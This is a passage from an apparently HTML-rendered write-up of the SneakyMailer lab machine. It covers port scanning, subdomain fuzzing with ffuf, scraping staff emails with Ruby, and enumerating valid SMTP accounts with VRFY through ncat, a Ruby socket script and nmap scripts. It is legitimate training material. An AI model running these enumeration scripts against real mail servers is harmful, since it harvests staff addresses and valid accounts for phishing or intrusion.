plain">|_SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_ssl-date: TLS randomness does not represent time</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">8080/tcp open  http     nginx 1.14.2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| http-methods:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  Supported Methods: GET HEAD</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-open-proxy: Proxy might be redirecting requests</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-server-header: nginx/1.14.2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-title: Welcome to nginx!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Read data files from: /usr/bin/../share/nmap</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Nmap done at Sun Nov  8 16:51:55 2020 -- 1 IP address (1 host up) scanned in 60.40 seconds</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can see there is a redirect from the web server on port 80 to <a href="http://sneakycorp.htb" target="_blank" rel="noopener noreferrer">http://sneakycorp.htb</a>,
so let&#x27;s add this local domain to <code>/etc/hosts</code>:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cat /etc/hosts | grep sneak</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">10.10.10.197 sneakycorp.htb</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="http-enumeration">HTTP enumeration<a href="#http-enumeration" class="hash-link" aria-label="Direct link to HTTP enumeration" title="Direct link to HTTP enumeration">​</a></h2><p>Let&#x27;s see if we can find links:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ lynx -dump -listonly -nonumbers http://sneakycorp.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   Visible links:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://sneakycorp.htb/index.php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://sneakycorp.htb/team.php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://sneakycorp.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://sneakycorp.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://sneakycorp.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://sneakycorp.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://sneakycorp.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   Hidden links:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://sneakycorp.htb/index.php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://sneakycorp.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://sneakycorp.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://sneakycorp.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://sneakycorp.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://sneakycorp.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://sneakycorp.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://sneakycorp.htb/#page-top</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Nothing useful, maybe the team page if we have a bruteforce to perform later.</p><p>Now we can try to find some sub-domains:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ffuf -u http://sneakycorp.htb/ -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -H &#x27;Host: FUZZ.sneakycorp.htb&#x27; -ac</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        /&#x27;___\  /&#x27;___\           /&#x27;___\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       /\ \__/ /\ \__/  __  __  /\ \__/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">         \ \_\   \ \_\  \ \____/  \ \_\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          \/_/    \/_/   \/___/    \/_/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       v1.2.0-git</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">________________________________________________</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Method           : GET</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: URL              : http://sneakycorp.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Header           : Host: FUZZ.sneakycorp.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Follow redirects : false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Calibration      : true</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Timeout          : 10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Threads          : 40</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Matcher          : Response status: 200,204,301,302,307,401,403</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Filter           : Response size: 185</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Filter           : Response words: 6</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Filter           : Response lines: 8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">________________________________________________</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dev                     [Status: 200, Size: 13737, Words: 4007, Lines: 341]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">:: Progress: [38267/38267] :: Job [1/1] :: 1807 req/sec :: Duration: [0:00:22] :: Errors: 0 ::</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can add <code>dev.sneakycorp.htb</code> to <code>/etc/hosts</code>:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cat /etc/hosts | grep sneak</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">10.10.10.197 sneakycorp.htb dev.sneakycorp.htb</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The dev site looks the same but there is an additional page:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ lynx -dump -listonly -nonumbers http://dev.sneakycorp.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   Visible links:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://dev.sneakycorp.htb/index.php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://dev.sneakycorp.htb/team.php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://dev.sneakycorp.htb/pypi/register.php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://dev.sneakycorp.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://dev.sneakycorp.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://dev.sneakycorp.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://dev.sneakycorp.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://dev.sneakycorp.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   Hidden links:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://dev.sneakycorp.htb/index.php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://dev.sneakycorp.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://dev.sneakycorp.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://dev.sneakycorp.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://dev.sneakycorp.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://dev.sneakycorp.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://dev.sneakycorp.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://dev.sneakycorp.htb/#page-top</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s try to register an account at <a href="http://dev.sneakycorp.htb/pypi/register.php" target="_blank" rel="noopener noreferrer">http://dev.sneakycorp.htb/pypi/register.php</a></p><p>We don&#x27;t know if it&#x27;s working or if it&#x27;s a rabbit hole and there is no login
page anyway.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="service-discovery">Service discovery<a href="#service-discovery" class="hash-link" aria-label="Direct link to Service discovery" title="Direct link to Service discovery">​</a></h2><p>The FTP is not accessible anonymously and we don&#x27;t have credentials yet.</p><p>There are a SMTP and IMAP server. This also another web server on port 8080
but found nothing while enumerating.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="smtp--imap-exploitation">SMTP &amp; IMAP exploitation<a href="#smtp--imap-exploitation" class="hash-link" aria-label="Direct link to SMTP &amp; IMAP exploitation" title="Direct link to SMTP &amp; IMAP exploitation">​</a></h2><p>Let&#x27;s connect to the SMTP server and try to verify some email addresses:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ncat sneakycorp.htb 25</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">220 debian ESMTP Postfix (Debian/GNU)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">vrfy cyfun@sneakymailer.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">550 5.1.1 &lt;cyfun@sneakymailer.htb&gt;: Recipient address rejected: User unknown in virtual mailbox table</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">vrfy airisatou@sneakymailer.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">252 2.0.0 airisatou@sneakymailer.htb</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>So it means our account was not created after filling the registration form
but emails listed on the team page seem valid.</p><p>I wrote a short ruby script to scrap &amp; parse the website to extract the email
addresses:</p><div class="language-ruby codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-ruby codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">#! /usr/bin/env ruby</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">require &#x27;nokogiri&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">require &#x27;open-uri&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">doc = Nokogiri::HTML(URI.open(&#x27;http://sneakycorp.htb/team.php&#x27;))</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cells = doc.search(&#x27;table#dataTable tbody tr td&#x27;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cells.each do |c|</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    puts c.text if /@sneakymailer.htb/.match?(c)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">end</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ruby grab_email.rb &gt; emails.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>If we want to verify all email addresses, we can re-use a
<a href="https://rubyfu.net/module-0x3-or-network-kung-fu/email/smtp-enumeration" target="_blank" rel="noopener noreferrer">Rubyfu - SMTP Enumeration</a>
script and modify it a bit.</p><div class="language-ruby codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-ruby codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">#!/usr/bin/env ruby</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">require &#x27;socket&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">users = File.read(&#x27;emails.txt&#x27;).split(&quot;\n&quot;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">found = []</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">@s = TCPSocket.new(&#x27;sneakycorp.htb&#x27;, 25)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">@banner = @s.recv(1024).chomp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">users.each do |user|</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  @s.send &quot;VRFY #{user} \n\r&quot;, 0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  resp = @s.recv(1024).chomp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  found &lt;&lt; user if resp.split[2] == user</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">end</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">@s.close</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">puts &quot;[*] Result:-&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">puts &quot;[+] Banner: &quot; + @banner</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">puts &quot;[+] Found users: \n#{found.join(&quot;\n&quot;)}&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>In theory there is <a href="https://nmap.org/" target="_blank" rel="noopener noreferrer">nmap</a> script for that too but it didn&#x27;t work in my case:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ nmap --script smtp-enum-users.nse --script-args smtp-enum-users.methods={VRFY},userdb=$(pwd)/emails.txt -p 25 sneakycorp.htb</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can use another script to very available commands:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ nmap --script smtp-commands.nse -pT:25 sneakycorp.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-08 19:03 CET</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap scan report for sneakycorp.htb (10.10.10.197)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host is up (0.022s latency).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PORT   STATE SERVICE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">25/tcp open  smtp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap done: 1 IP address (1 host up) scanned in 10.36 seconds</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>There is another script to check for open relay but it doesn&#x27;t work here
(maybe because the anti-spam test target nmap.scanme.org by default).</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ nmap --script smtp-open-relay.nse  -p 25 sneakycorp.htb --script-args smtp-open-relay.to=tigernixon@sneakymailer.htb,smtp-open-relay.from=cyfun@sneakymailer.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-08 19:09 CET</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap scan report for sneakycorp.htb (10.10.10.197)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host is up (0.023s latency).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PORT   STATE SERVICE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">25/tcp open  smtp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_smtp-open-relay: Server doesn&#x27;t seem to be an open relay, all tests failed</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap done: 1 IP address (1 host up) scanned in 29.45 seconds</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Before going farther I checked we can&#x27;t read emails from the account we
registered. The <a href="https://book.hacktricks.xyz/pentesting/pentesting-imap#syntax" target="_blank" rel="noopener noreferrer">HackTricks - IMAP Syntax</a>
